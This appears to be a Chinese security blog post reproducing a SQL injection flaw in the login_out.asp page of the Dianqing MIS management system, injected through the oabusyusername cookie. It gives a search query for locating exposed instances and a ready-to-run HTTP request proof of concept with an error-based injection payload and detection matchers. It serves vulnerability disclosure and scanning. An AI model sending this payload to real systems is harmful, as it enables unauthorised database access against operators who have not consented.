#  [漏洞复现]点晴MIS管理信息系统login_out.asp存在SQL注入漏洞(VEID-2025-1205)  
老谢
                    老谢  H4ll0 H4ck3r   2026-04-01 01:03  
  
```

声明: 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，H4ll0 H4ck3r及文章作者不为此承担任何责任。
H4ll0 H4ck3r拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经H4ll0 H4ck3r允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

```  
  
**漏洞描述**  
```
该漏洞出现在点晴MIS系统的 login_out.asp 文件中。
系统在处理用户注销或会话相关逻辑时，未对 Cookie 中的 
oabusyusername 参数进行有效的过滤或 sanitization（清理），
导致攻击者可以通过构造特殊的 Cookie 值来篡改后台SQL查询语句的结构
```  
  
**影响版本**  
```
点晴MIS管理信息系统
```  
  
**空间测绘**  
```
title="点晴MIS管理信息系统"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXNDg59VIZb5iapyUzhodnLw283ys80dhkd5W45S2GIEfmPHE5YAE7sic4quMGiasibJxuH4dzWtQbyCia9AQbXgZicWpWFUW1egNAyLk/640?wx_fmt=png&from=appmsg "")  
  
**本地漏洞环境复现**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXOSLxztRWChcOtQALCdqb9eyAHQcCFIez0MTp7ribCKibI0Iibh7ibctuwYBx0xQYDqIcmQzuB6HZq3ibBpqibJjTuBVzpU3u1LvWrLI/640?wx_fmt=png&from=appmsg "")  
  
**Veil POC**  
```
GET /login_out.asp HTTP/1.1
Host: {{Hostname}}
Cookie: oabusyusername=1'+and+@@VERSION>1--
User-Agent: {{random_ua}}

#@ condition: and
#@ matcher: header["Content-Type"] contains "html" 
#@ matcher: body contains "转换成数据类型 int 时失败"
#@ matcher: status_code == 500
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaZeP7cJpWXNGUD6YUuB0HjcvuaYq30pgg23CTJFu8IIcPkbvXoGZuEiamXOLY4cHupGrgw5Kg75R1T7K9ZJOHG844NasX6fiaaJxoyv0ofX1I/640?wx_fmt=png&from=appmsg "")  
  
